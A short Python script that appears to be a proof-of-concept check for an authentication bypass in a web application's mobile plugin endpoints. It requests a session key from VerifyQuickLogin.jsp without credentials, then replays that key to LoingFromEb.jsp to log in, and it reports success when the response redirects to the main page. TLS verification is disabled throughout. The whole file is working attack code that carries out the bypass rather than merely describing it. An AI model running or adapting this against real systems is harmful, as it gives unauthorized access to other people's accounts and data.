import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"mobile/plugin/VerifyQuickLogin.jsp"
	body="identifier=1&language=1&ipaddress=x.x.x.x"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "{\"sessionkey\":\"" in response.text and "\"message\":\"1\"}" in response.text:
		r0=True
		try:
			id1=re.findall("sessionkey\":(.+?)\"",response.text)[0]
			id=id1.replace('"','')
		except:
			id=''
	else:
		id=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"mobile/plugin/plus/login/LoingFromEb.jsp"
	body=f"loginkey={id}"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "window.location.href=\"/login/RemindLogin.jsp?RedirectFile=/wui/main.jsp\";" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
